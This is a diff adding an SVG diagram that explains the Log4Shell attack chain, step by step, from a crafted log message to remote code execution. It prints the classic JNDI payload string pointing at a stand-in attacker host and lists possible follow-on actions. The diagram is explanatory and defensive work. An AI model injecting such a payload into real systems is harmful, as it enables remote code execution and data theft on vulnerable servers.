@@ -1,0 +1,95 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 500" width="900" height="500" font-family="monospace">
+  <rect width="900" height="500" fill="#1e1e2e"/>
+  <text x="450" y="30" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Log4Shell: Attack Chain — From Log Message to Remote Code Execution</text>
+  
+  <!-- Step 1: Attacker sends crafted string -->
+  <rect x="60" y="70" width="220" height="65" rx="8" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="170" y="92" text-anchor="middle" fill="#f38ba8" font-size="10" font-weight="bold">1. Attacker</text>
+  <text x="170" y="108" text-anchor="middle" fill="#cdd6f4" font-size="8">Sends crafted string in any</text>
+  <text x="170" y="120" text-anchor="middle" fill="#cdd6f4" font-size="8">user-controllable field</text>
+  
+  <!-- The payload -->
+  <rect x="100" y="145" width="260" height="30" rx="3" fill="#45475a" stroke="#f38ba8" stroke-width="1"/>
+  <text x="230" y="164" text-anchor="middle" fill="#f38ba8" font-size="9">${jndi:ldap://attacker.com/exploit}</text>
+  
+  <!-- Arrow -->
+  <line x1="280" y1="102" x2="360" y2="102" stroke="#f38ba8" stroke-width="2" marker-end="url(#arrowLS)"/>
+  <text x="320" y="92" fill="#a6adc8" font-size="8">HTTP header,</text>
+  <text x="320" y="80" fill="#a6adc8" font-size="8">form field, etc.</text>
+  
+  <!-- Step 2: Application logs -->
+  <rect x="360" y="70" width="220" height="65" rx="8" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="470" y="92" text-anchor="middle" fill="#89b4fa" font-size="10" font-weight="bold">2. Application</text>
+  <text x="470" y="108" text-anchor="middle" fill="#cdd6f4" font-size="8">Passes string to Log4j</text>
+  <text x="470" y="120" text-anchor="middle" fill="#cdd6f4" font-size="8">logger.info(userInput)</text>
+  
+  <!-- Arrow -->
+  <line x1="580" y1="102" x2="660" y2="102" stroke="#89b4fa" stroke-width="2" marker-end="url(#arrowBS)"/>
+  
+  <!-- Step 3: Log4j processes -->
+  <rect x="660" y="70" width="190" height="65" rx="8" fill="#313244" stroke="#f9e2af" stroke-width="2"/>
+  <text x="755" y="92" text-anchor="middle" fill="#f9e2af" font-size="10" font-weight="bold">3. Log4j</text>
+  <text x="755" y="108" text-anchor="middle" fill="#cdd6f4" font-size="8">Message lookup finds ${}</text>
+  <text x="755" y="120" text-anchor="middle" fill="#cdd6f4" font-size="8">Triggers JNDI resolution</text>
+  
+  <!-- Arrow down from Log4j -->
+  <line x1="755" y1="135" x2="755" y2="195" stroke="#f9e2af" stroke-width="2" marker-end="url(#arrowYS)"/>
+  <text x="770" y="168" fill="#f9e2af" font-size="8">JNDI</text>
+  <text x="770" y="180" fill="#f9e2af" font-size="8">lookup</text>
+  
+  <!-- Step 4: LDAP connection -->
+  <rect x="620" y="195" width="230" height="65" rx="8" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="735" y="217" text-anchor="middle" fill="#f38ba8" font-size="10" font-weight="bold">4. LDAP Request</text>
+  <text x="735" y="233" text-anchor="middle" fill="#cdd6f4" font-size="8">JVM connects to attacker's</text>
+  <text x="735" y="245" text-anchor="middle" fill="#cdd6f4" font-size="8">LDAP server over the network</text>
+  
+  <!-- Arrow to attacker server -->
+  <line x1="735" y1="260" x2="735" y2="310" stroke="#f38ba8" stroke-width="2" marker-end="url(#arrowLS)"/>
+  
+  <!-- Step 5: Attacker's LDAP responds -->
+  <rect x="600" y="310" width="260" height="65" rx="8" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="730" y="332" text-anchor="middle" fill="#f38ba8" font-size="10" font-weight="bold">5. Attacker's LDAP Server</text>
+  <text x="730" y="348" text-anchor="middle" fill="#cdd6f4" font-size="8">Returns reference to Java class</text>
+  <text x="730" y="360" text-anchor="middle" fill="#cdd6f4" font-size="8">hosted on attacker's HTTP server</text>
+  
+  <!-- Arrow to class loading -->
+  <line x1="600" y1="342" x2="460" y2="342" stroke="#f38ba8" stroke-width="2" marker-end="url(#arrowLSRev)"/>
+  
+  <!-- Step 6: Class loaded and executed -->
+  <rect x="200" y="310" width="260" height="65" rx="8" fill="#f38ba8" fill-opacity="0.15" stroke="#f38ba8" stroke-width="2.5"/>
+  <text x="330" y="332" text-anchor="middle" fill="#f38ba8" font-size="10" font-weight="bold">6. Remote Code Execution</text>
+  <text x="330" y="348" text-anchor="middle" fill="#cdd6f4" font-size="8">JVM downloads and executes</text>
+  <text x="330" y="360" text-anchor="middle" fill="#f38ba8" font-size="9" font-weight="bold">attacker's arbitrary Java class</text>
+  
+  <!-- What the attacker can do -->
+  <line x1="330" y1="375" x2="330" y2="405" stroke="#f38ba8" stroke-width="1.5"/>
+  
+  <rect x="60" y="405" width="140" height="35" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="1"/>
+  <text x="130" y="427" text-anchor="middle" fill="#f38ba8" font-size="9">Reverse shell</text>
+  
+  <rect x="220" y="405" width="140" height="35" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="1"/>
+  <text x="290" y="427" text-anchor="middle" fill="#f38ba8" font-size="9">Data exfiltration</text>
+  
+  <rect x="380" y="405" width="140" height="35" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="1"/>
+  <text x="450" y="427" text-anchor="middle" fill="#f38ba8" font-size="9">Crypto mining</text>
+  
+  <rect x="540" y="405" width="140" height="35" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="1"/>
+  <text x="610" y="427" text-anchor="middle" fill="#f38ba8" font-size="9">Ransomware</text>
+  
+  <line x1="130" y1="405" x2="330" y2="395" stroke="#585b70" stroke-width="0.5"/>
+  <line x1="290" y1="405" x2="330" y2="395" stroke="#585b70" stroke-width="0.5"/>
+  <line x1="450" y1="405" x2="330" y2="395" stroke="#585b70" stroke-width="0.5"/>
+  <line x1="610" y1="405" x2="330" y2="395" stroke="#585b70" stroke-width="0.5"/>
+
+  <!-- Key insight -->
+  <rect x="60" y="455" width="780" height="30" rx="5" fill="#313244"/>
+  <text x="80" y="474" fill="#a6e3a1" font-size="10" font-weight="bold">The Rule:</text>
+  <text x="160" y="474" fill="#cdd6f4" font-size="10">A library must not have capabilities beyond its stated purpose. Logging should not fetch URLs.</text>
+
+  <defs>
+    <marker id="arrowLS" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" fill="#f38ba8"/></marker>
+    <marker id="arrowBS" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" fill="#89b4fa"/></marker>
+    <marker id="arrowYS" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" fill="#f9e2af"/></marker>
+    <marker id="arrowLSRev" viewBox="0 0 10 10" refX="0" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 10 0 L 0 5 L 10 10 z" fill="#f38ba8"/></marker>
+  </defs>
+</svg>
